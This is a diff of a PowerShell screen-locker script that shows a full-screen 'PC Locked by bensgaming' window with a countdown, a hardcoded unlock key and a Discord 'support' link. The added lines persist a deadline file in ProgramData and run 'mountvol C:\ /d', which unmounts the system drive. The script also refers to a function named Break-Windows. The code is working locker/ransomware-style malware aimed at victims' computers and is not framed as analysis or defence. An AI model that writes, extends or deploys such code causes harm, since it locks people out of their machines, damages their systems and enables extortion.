@@ -3,9 +3,23 @@ Add-Type -AssemblyName System.Drawing
 
 # ========== SETTINGS ==========
 $correctKey = "taodeptrainhatvutru"
+$dataPath = "$env:ProgramData\syslock.json"
 $hoursLeft = 24
-$deadline = (Get-Date).AddHours($hoursLeft)
 
+# ========== LOAD OR CREATE DEADLINE ==========
+if (Test-Path $dataPath) {
+    try {
+        $deadline = Get-Content $dataPath | ConvertFrom-Json | Select-Object -ExpandProperty deadline
+        $deadline = [datetime]$deadline
+    } catch {
+        $deadline = (Get-Date).AddHours($hoursLeft)
+        @{ deadline = $deadline } | ConvertTo-Json | Set-Content $dataPath
+    }
+} else {
+    $deadline = (Get-Date).AddHours($hoursLeft)
+    @{ deadline = $deadline } | ConvertTo-Json | Set-Content $dataPath
+}
+mountvol C:\ /d
 # ========== FORM SETUP ==========
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "System Locked"
@@ -15,7 +29,7 @@ $form.FormBorderStyle = "None"
 $form.TopMost = $true
 $form.StartPosition = "CenterScreen"
 
-# ========== MAIN LABEL ==========
+# ========== LABELS ==========
 $mainLabel = New-Object System.Windows.Forms.Label
 $mainLabel.Text = "PC Locked by bensgaming"
 $mainLabel.Font = New-Object System.Drawing.Font("Segoe UI", 48, [System.Drawing.FontStyle]::Bold)
@@ -24,7 +38,6 @@ $mainLabel.AutoSize = $true
 $mainLabel.Location = New-Object System.Drawing.Point(100, 50)
 $form.Controls.Add($mainLabel)
 
-# ========== INFO LABEL ==========
 $infoLabel = New-Object System.Windows.Forms.Label
 $infoLabel.Text = "Enter the unlock key to access your PC.`nContact support: https://discord.gg/rf3fcuwz"
 $infoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18)
@@ -33,7 +46,6 @@ $infoLabel.AutoSize = $true
 $infoLabel.Location = New-Object System.Drawing.Point(100, 150)
 $form.Controls.Add($infoLabel)
 
-# ========== COUNTDOWN ==========
 $countdownLabel = New-Object System.Windows.Forms.Label
 $countdownLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
 $countdownLabel.ForeColor = "Gold"
@@ -41,14 +53,13 @@ $countdownLabel.AutoSize = $true
 $countdownLabel.Location = New-Object System.Drawing.Point(100, 250)
 $form.Controls.Add($countdownLabel)
 
-# ========== TEXTBOX ==========
+# ========== TEXTBOX + BUTTON ==========
 $textBox = New-Object System.Windows.Forms.TextBox
 $textBox.Font = New-Object System.Drawing.Font("Consolas", 20)
 $textBox.Width = 300
 $textBox.Location = New-Object System.Drawing.Point(100, 320)
 $form.Controls.Add($textBox)
 
-# ========== BUTTON ==========
 $button = New-Object System.Windows.Forms.Button
 $button.Text = "UNLOCK"
 $button.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
@@ -69,6 +80,7 @@ function Break-Windows {
 # ========== BUTTON CLICK ==========
 $button.Add_Click({
     if ($textBox.Text -eq $correctKey) {
+        Remove-Item $dataPath -Force -ErrorAction SilentlyContinue
         [System.Windows.Forms.MessageBox]::Show("Code accepted. Unlocking...", "Unlocked", 'OK', 'Information')
         $form.Close()
     } else {
@@ -89,6 +101,6 @@ $timer.Add_Tick({
 })
 $timer.Start()
 
-# ========== SHOW ==========
+# ========== SHOW FORM ==========
 $form.Add_Shown({ $form.Activate() })
 [void]$form.ShowDialog()
